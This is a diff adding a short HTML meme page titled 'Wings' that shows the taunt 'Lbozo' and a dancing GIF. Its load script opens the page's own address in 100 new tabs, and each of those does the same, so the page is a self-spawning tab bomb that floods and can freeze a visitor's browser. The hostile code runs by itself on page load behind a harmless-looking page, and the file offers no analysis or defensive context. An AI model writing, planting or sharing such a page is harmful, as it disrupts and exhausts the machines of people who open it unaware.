@@ -1,0 +1,44 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wings</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #fff;
+            flex-direction: column;
+            text-align: center;
+        }
+        .text {
+            position: absolute;
+            top: 20px;
+            width: 100%;
+            font-family: 'Comic Sans MS', cursive, sans-serif;
+            font-size: 32px;
+            color: pink;
+        }
+        .gif {
+            position: relative;
+            top: 100px;
+        }
+    </style>
+    <script type="text/javascript">
+        function openTabs() {
+            const currentUrl = window.location.href;
+            for (let i = 0; i < 100; i++) {
+                window.open(currentUrl, '_blank');
+            }
+        }
+        window.onload = openTabs;
+    </script>
+</head>
+<body>
+    <div class="text">Lbozo</div>
+    <img class="gif" src="https://media.tenor.com/rwB50q_sDtkAAAAi/wingsdance-wings-of-redemption.gif" ">
+</body>
+</html>
